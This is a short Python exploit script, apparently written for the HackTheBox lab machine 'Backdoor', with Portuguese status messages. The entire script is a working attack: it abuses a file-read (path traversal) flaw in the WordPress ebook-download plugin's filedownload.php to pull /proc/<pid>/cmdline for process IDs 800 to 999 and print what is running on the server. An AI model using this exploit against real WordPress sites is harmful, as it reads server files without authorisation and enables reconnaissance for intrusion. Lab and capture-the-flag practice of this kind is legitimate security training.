#!/usr/bin/python3
# codind:utf-8

from pwn import *
import requests,pdb,sys,signal,time

def def_handler(sig,frame):
	print("\n[!]Saindo...\n")
	sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT,def_handler)

# Variable_global
main_url = "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="
burp = {'http': 'http://127.0.0.1:8080'}

def makeRequest():

	p1 = log.progress("exploit_cmdline")
	p1.status("Start")

	time.sleep(1)

	print()

	for i in range(800,1000):

		p1.status(f"Verify: /proc/{i}/cmdline")
	
		r = requests.get(main_url + f"/proc/{i}/cmdline")

		if len(r.content) > 110:
			print(r.content.decode())
			print()

if __name__ == '__main__':
	makeRequest()
